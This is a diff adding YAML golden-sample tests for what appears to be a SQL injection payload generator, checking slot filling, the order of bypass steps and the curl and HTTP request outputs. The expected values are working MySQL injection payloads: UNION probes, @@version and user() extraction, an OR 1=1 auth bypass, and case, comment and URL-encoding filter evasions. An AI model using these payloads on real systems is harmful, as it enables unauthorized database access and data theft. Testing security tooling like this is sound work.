@@ -1,0 +1,249 @@
+# 黄金样本（§13.2）
+#
+# 纪律：**期望值必须独立来源，不能由工具的运行结果反向生成。**
+# 若做法是"跑一遍工具、把输出粘进 expect"，测试就只是把当前行为（含 bug）
+# 固化成规范，永远不会失败，也永远发现不了"替换时机搞反""编码层顺序错"
+# 这类静默错误。以下每一条都是手写并按 §7 管线逐层核算的。
+#
+# expect.outputs 只写关心的那几层，未列出的不比对。
+
+ruleDB: v0.1.0
+
+samples:
+  # ---------- 槽位填充 ----------
+
+  - name: 默认槽位
+    state:
+      template: sqli.mysql.union.basic
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,3 -- -"
+
+  - name: 自定义槽位
+    state:
+      template: sqli.mysql.union.basic
+      slots: {close: "')", cols: "4", comment: "#"}
+      outputs: [raw]
+    expect:
+      payload: "') UNION SELECT 1,2,3,4 #"
+
+  # ---------- 回显位数与回显位（`<<select(cols,pos,...)>>`）----------
+  # 探注入的两步：先定列数，再定哪一位回显，然后把要爆的东西放到那一位上。
+
+  - name: 列数可变（5 列）
+    state:
+      template: sqli.mysql.union.basic
+      slots: {cols: "5"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,3,4,5 -- -"
+
+  - name: 缺省回显位是第 1 位（与旧版写死的行为一致）
+    state:
+      template: sqli.mysql.union.version
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT @@version,2,3 -- -"
+
+  - name: 回显位在第 2 位
+    state:
+      template: sqli.mysql.union.version
+      slots: {pos: "2"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,@@version,3 -- -"
+
+  - name: 5 列、回显位在第 4 位
+    state:
+      template: sqli.mysql.union.version
+      slots: {cols: "5", pos: "4"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,3,@@version,5 -- -"
+
+  - name: 标记按回显位放置
+    state:
+      template: sqli.mysql.union.marker
+      slots: {cols: "3", pos: "2"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,0x41,3 -- -"
+
+  - name: 回显位超过列数 → 报出来，不静默留占位符
+    state:
+      template: sqli.mysql.union.version
+      slots: {cols: "3", pos: "5"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT <<select(cols,pos,expr)>> -- -"
+      checks_count: 1
+
+  # ---------- 变量替换（契约 1：先替换，后编码/绕过）----------
+
+  - name: 变量替换发生在绕过之前
+    state:
+      template: sqli.mysql.union.expr
+      slots: {close: "'", comment: "-- -"}
+      vars: {expr: "user()"}
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT user(),2,3 -- -"
+
+  # ---------- 绕过 ----------
+
+  - name: URL 编码
+    state:
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.url]
+      outputs: [raw, encoded]
+    expect:
+      payload: "%27%20UNION%20SELECT%201%2C2%2C3%20--%20-"
+      outputs:
+        raw: "%27%20UNION%20SELECT%201%2C2%2C3%20--%20-"
+
+  - name: 交替大小写只作用于指定关键字
+    state:
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.case.alternate]
+      outputs: [raw]
+    expect:
+      payload: "' UnIoN SeLeCt 1,2,3 -- -"
+
+  - name: 大小写先、URL 编码后（管线顺序）
+    state:
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.case.alternate, bypass.url]
+      outputs: [raw]
+    expect:
+      payload: "%27%20UnIoN%20SeLeCt%201%2C2%2C3%20--%20-"
+
+  - name: 注释替代空格
+    state:
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.space.comment]
+      outputs: [raw]
+    expect:
+      payload: "'/**/UNION/**/SELECT/**/1,2,3/**/--/**/-"
+
+  # ---------- 输出层 ----------
+
+  - name: curl 输出（GET + URL 参数）
+    state:
+      template: sqli.mysql.union.basic
+      submit: query
+      host: example.com
+      path: /
+      param: id
+      method: GET
+      shell: bash
+      outputs: [curl]
+    expect:
+      outputs:
+        curl: "curl 'http://example.com/?id=%27%20UNION%20SELECT%201%2C2%2C3%20--%20-'"
+
+  - name: 完整请求输出（POST + JSON body）
+    state:
+      template: sqli.mysql.auth.bypass
+      submit: json
+      method: POST
+      host: example.com
+      path: /
+      param: id
+      outputs: [request]
+    expect:
+      payload: "' OR 1=1 -- -"
+      outputs:
+        request: "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\nContent-Length: 23\r\n\r\n{\"id\": \"' OR 1=1 -- -\"}"
+
+  # ---------- 成品约束校验（§8.2，提示不拦截）----------
+
+  - name: 约束校验给出提示但照常输出
+    state:
+      template: sqli.mysql.union.basic
+      outputs: [raw]
+      constraints:
+        max_len: 10
+        forbidden_chars: ["'"]
+        blocked_keywords: ["union"]
+    expect:
+      payload: "' UNION SELECT 1,2,3 -- -"
+      checks_count: 3
+
+  # ---------- skip_quoted：只在引号外变换（§6.2）----------
+  # 没有 skip_quoted 的话，`'a b'` 会被空格替换加工成 `'a/**/b'`——
+  # 语法依旧合法，语义已经错了。这类损坏是**静默**的。
+
+  - name: skip_quoted 保护字符串字面量里的空格
+    state:
+      template: sqli.mysql.union.marker
+      slots: {marker: "'a b'"}
+      bypasses: [bypass.space.plus]
+      outputs: [raw]
+    expect:
+      # 开头的 ' 是逃逸上层引号的闭合符，按代码处理；'a b' 是字面量，原样保留
+      payload: "'+UNION+SELECT+'a b',2,3+--+-"
+
+  - name: skip_quoted 保护字面量里的关键字，同时照拆引号外的同名关键字
+    state:
+      template: sqli.mysql.union.expr
+      vars: {expr: "'SELECT'"}
+      bypasses: [bypass.keyword.select]
+      outputs: [raw]
+    expect:
+      # 用的是拆 SELECT 的绕过（不是拆 UNION 的），所以字面量 'SELECT' 正是目标——
+      # 没有 skip_quoted 的话它会被拆成 'SEL/**/ECT'，语义就变了
+      payload: "' UNION SEL/**/ECT 'SELECT',2,3 -- -"
+
+  - name: skip_quoted 对大小写绕过同样生效
+    state:
+      template: sqli.mysql.union.expr
+      vars: {expr: "'select'"}
+      bypasses: [bypass.case.upper]
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 'select',2,3 -- -"
+
+  # ---------- 重复编码提示（§8.2）----------
+
+  - name: sqli.mysql.union.basic · 绕过层已 URL 编码、传输层再编一次 → 提示但不拦截
+    state:
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.url]
+      submit: query
+      outputs: [raw]
+    expect:
+      payload: "%27%20UNION%20SELECT%201%2C2%2C3%20--%20-"
+      checks_count: 1
+
+  - name: 双重 URL 编码绕过算两次，提示里如实计数
+    state:
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.url2]
+      submit: query
+      outputs: [raw]
+    expect:
+      checks_count: 1
+
+  # ---------- 版本软标记（§11：版本不符不禁用）----------
+
+  - name: 版本不符仍可生成，只标记
+    state:
+      template: sqli.mysql.error.extractvalue
+      version: "8.0.32"
+      slots: {close: "'", comment: "-- -"}
+      vars: {expr: "@@version"}
+      outputs: [raw]
+    expect:
+      payload: "' AND extractvalue(1,concat(0x7e,(@@version),0x7e)) -- -"
+      note: 版本不符
+
+  # ---------- 空结果 ----------
+
+  - name: 没有可用模板时给出全部原因（漏洞类型与内容类型互相错配）
+    state:
+      vuln: rce
+      content_type: sql-expression
+      outputs: [raw]
+    expect:
+      ok: false
+
